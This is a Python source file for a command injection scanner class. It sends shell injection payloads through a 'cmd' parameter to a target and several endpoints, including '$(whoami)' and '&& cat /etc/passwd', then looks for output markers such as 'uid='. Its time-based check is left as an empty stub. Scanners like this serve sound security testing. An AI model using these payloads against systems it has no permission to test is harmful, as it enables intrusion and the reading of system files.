import re
import urllib.parse
from typing import Dict, Optional, List

from core.base_scanner import BaseScanner

class CommandInjectionScanner(BaseScanner):
    def __init__(self, target_url: str, config: Dict):
        super().__init__(target_url, config)
        self.payloads = [
            # Unix/Linux Command Injection Payloads
            '$(whoami)',
            '`whoami`',
            ';whoami',
            '&&whoami',
            '||whoami',
            
            # Windows Command Injection Payloads
            '$(systeminfo)',
            '&& dir',
            '|| ver',
            
            # File System Exploration
            ';ls -la',
            '&& cat /etc/passwd',
            '|| echo VULNERABLE',
            
            # Network Information
            ';ifconfig',
            '&& netstat -tuln',
            
            # Time-based Blind Command Injection
            '&& sleep 5',
            '|| sleep 5',
            
            # Special Characters
            '|',
            '||',
            '&&',
            ';',
            '$()',
            '`cmd`'
        ]
        
        # Endpoints to test
        self.endpoints = [
            '/xxe',
            '/dom',
            '/nosql_search',
            '/reset',
            '/search',
            '/ssrf',
            '/ldap',
            '/include',
            '/ping',
            '/system/info',
            '/admin/command',
            '/network/test'
        ]
    
    def scan(self) -> Dict[str, List[Dict]]:
        """
        Perform command injection vulnerability scanning
        
        Returns:
            Dict of detected vulnerabilities
        """
        vulnerabilities = []
        
        # Test base URL
        base_result = self.test_command_injection(self.target_url)
        if base_result:
            vulnerabilities.append(base_result)
        
        # Test additional endpoints
        for endpoint in self.endpoints:
            full_url = self.target_url.rstrip('/') + endpoint
            result = self.test_command_injection(full_url)
            if result:
                vulnerabilities.append(result)
        
        return {
            'command_injection': vulnerabilities
        } if vulnerabilities else {}
    
    def test_command_injection(self, url: str) -> Optional[Dict]:
        """
        Test a specific URL for command injection vulnerabilities
        
        Args:
            url (str): URL to test
        
        Returns:
            Optional vulnerability details
        """
        for payload in self.payloads:
            # Encode payload to handle special characters
            encoded_payload = urllib.parse.quote(payload)
            
            # Test GET parameters
            test_url = f"{url}?cmd={encoded_payload}"
            response = self.make_request(test_url)
            
            if self.verify_command_injection(response, payload):
                return {
                    'type': 'Command Injection',
                    'url': test_url,
                    'payload': payload,
                    'risk': 'High',
                    'description': f'Potential command injection vulnerability detected with payload: {payload}',
                    'recommendation': 'Implement strict input validation, use parameterized commands, and avoid shell execution with user input.'
                }
        
        return None
    
    def verify_command_injection(self, response, payload: str) -> bool:
        """
        Verify if the response indicates a successful command injection
        
        Args:
            response: HTTP response object
            payload (str): Injected payload
        
        Returns:
            bool: True if command injection is detected
        """
        if not response:
            return False
        
        # Check response text for command execution indicators
        response_text = str(response.text).lower()
        
        # List of potential command execution indicators
        indicators = [
            'uid=',     # Unix user ID
            'root:x:',  # Passwd file
            'windows',
            'systeminfo',
            'netstat',
            'ifconfig',
            'localhost',
            'command executed successfully'
        ]
        
        # Check for time-based payloads
        if 'sleep' in payload:
            # Check if response time is significantly delayed
            pass
        
        # Check for specific command output or system indicators
        return any(indicator in response_text for indicator in indicators)
    
    def execute_task(self, task: Dict) -> Optional[Dict]:
        """
        Execute a specific command injection task
        
        Args:
            task (Dict): Task configuration
        
        Returns:
            Optional vulnerability details
        """
        if task['type'] == 'command_injection':
            return self.test_command_injection(task['url'])
        
        return None
